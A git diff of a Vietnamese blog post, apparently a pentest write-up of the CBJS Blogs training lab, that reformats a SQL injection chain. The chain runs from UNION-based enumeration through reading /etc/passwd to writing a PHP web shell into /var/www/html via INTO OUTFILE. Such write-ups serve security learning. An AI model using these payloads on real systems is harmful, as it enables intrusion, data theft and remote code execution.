@@ -11,7 +11,7 @@ categories: jekyll update
 Báo cáo này nhằm liệt kê các lỗ hổng bảo mật và các vấn đề liên quan được phát hiện trong quá trình kiểm thử ứng dụng ```CBJS Blogs```
 ## 2. Đối tượng 
 Các mục tiêu kiểm thử bao gồm: 
-- ```http://blogs-chain.cyberjutsu-lab.tech:8090/```
+- `http://blogs-chain.cyberjutsu-lab.tech:8090/`
 ## 3. Phạm vi 
 Phạm vi kiểm thử bao gồm toàn bộ chức năng của ứng dụng CBJS Blogs, được triển khai trên đối tượng. 
 
@@ -37,9 +37,12 @@ Lỗ hổng SQL Injection xảy ra do lập trình viên không áp dụng các 
 
 ### Step to reproduce 
 Đầu tiên, mình sẽ thực hiện xem câu `query` gốc truy vấn trong table `posts` có bao nhiêu `column` bằng `ORDER BY`
-|ORDER BY 3 --> ko gây lỗi
-| ORDER BY 4 --> ko gây lỗi
-| ORDER BY 5 --> gây lỗi
+
+```
+ORDER BY 3 --> ko gây lỗi
+ORDER BY 4 --> ko gây lỗi
+ORDER BY 5 --> gây lỗi
+```
 
 Từ đây mình có thể xác định được là query 4 cột trong câu query gốc. 
 
@@ -48,20 +51,29 @@ Từ đây mình có thể xác định được là query 4 cột trong câu qu
 
 Đồng thời khi lỗi thì web lại tiết lộ Document Root là <code>/var/www/html</code>
 
-Tiếp tục mình xác định tên DB của web 
-| UNION SELECT 1,2,3,DATABASE()
+Tiếp tục mình xác định tên DB của web
+
+```
+UNION SELECT 1,2,3,DATABASE()
+```
 
 ![image](/assets/images/WPT/cbjs-blog/image4.png)
 <p style="text-align:center;"><em>Xác định tên DB</em></p>
 
-Xác định tên table trong DB 
-| UNION 1,2,3,GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='blog'
+Xác định tên table trong DB
+
+```
+UNION 1,2,3,GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='blog'
+```
 
 ![image](/assets/images/WPT/cbjs-blog/image5.png)
 <p style="text-align:center;"><em>Xác định tên table</em></p>
 
 Xác định tên column trong DB 
-| UNION SELECT 1,2,3,GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='posts'
+
+```
+UNION SELECT 1,2,3,GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='posts'
+```
 
 ![image](/assets/images/WPT/cbjs-blog/image6.png)
 <p style="text-align:center;"><em>Xác định tên cột</em></p>
@@ -80,13 +92,19 @@ Sau khi kiểm tra quyền của user hiện tại của cơ sở dữ liệu th
 Lỗ hổng xảy ra do không sử dụng cơ chế truy vấn an toàn (prepared statements) trong xử lý tham số `id` trên endpoint `/post.php`, dẫn đến SQL Injection từ lỗ hổng `CBJS-01`. Ngoài ra, hệ thống còn cấp quyền quá mức cho tài khoản `admin`, bao gồm cả khả năng ghi tệp vào thư mục webroot, tạo điều kiện để kẻ tấn công thực hiện Remote Code Execution sau khi leo thang đặc quyền.
 ### Step to reproduce 
 Từ tham số id, kiểm tra user hiện tại. 
-| UNION SELECT 1,2,3,GROUP_CONCAT(user())
+
+```
+UNION SELECT 1,2,3,GROUP_CONCAT(user())
+```
 
 ![image](/assets/images/WPT/cbjs-blog/image7.png)
 <p style="text-align:center;"><em>Xác định user hiện tại</em></p>
 
 Kiểm tra tiếp theo là quyền của user này. 
-| UNION SELECT 1,2,grantee,privilege_type FROM information_schema.user_privileges WHERE grantee="'admin'@'localhost'"
+
+```
+UNION SELECT 1,2,grantee,privilege_type FROM information_schema.user_privileges WHERE grantee="'admin'@'localhost'"
+```
 
 ![image](/assets/images/WPT/cbjs-blog/image8.png)
 <p style="text-align:center;"><em>Xác định quyền user hiện tại</em></p>
@@ -94,19 +112,28 @@ Kiểm tra tiếp theo là quyền của user này.
 Thì hầu hết các quyền cao nhất đều nằm ở user này. 
 
 Từ đây mình có thể tác với file chẳng hạn như load 1 file lên để đọc. 
-| UNION SELECT 1,2,3,LOAD_FILE('/etc/passwd')
+
+```
+UNION SELECT 1,2,3,LOAD_FILE('/etc/passwd')
+```
 
 ![image](/assets/images/WPT/cbjs-blog/image9.png)
 <p style="text-align:center;"><em>Đọc file /etc/passwd</em></p>
 
 Kiểm tra xem có biến `secure_file_priv` nếu có thì chắc chắn mình ghi file được.
-| UNION SELECT 1,2,variable_name,variable_value FROM performance_schema.global_variables WHERE variable_name="secure_file_priv"
+
+```
+UNION SELECT 1,2,variable_name,variable_value FROM performance_schema.global_variables WHERE variable_name="secure_file_priv"
+```
 
 ![image](/assets/images/WPT/cbjs-blog/image10.png)
 <p style="text-align:center;"><em>Kiểm tra quyền ghi file</em></p>
 
-Từ đây, mình ghi 1 `web shell` như sau: 
-| UNION SELECT "","","",'<?php system($_REQUEST[1]); ?>' INTO OUTFILE ('/var/www/html/shell.php')
+Từ đây, mình ghi 1 `web shell` như sau:
+
+```
+UNION SELECT 1,2,3,'<?php system($_REQUEST[1]); ?>' INTO OUTFILE '/var/www/html/shell.php'
+```
 
 ![image](/assets/images/WPT/cbjs-blog/image11.png)
 <p style="text-align:center;"><em>Ghi một web shell</em></p>
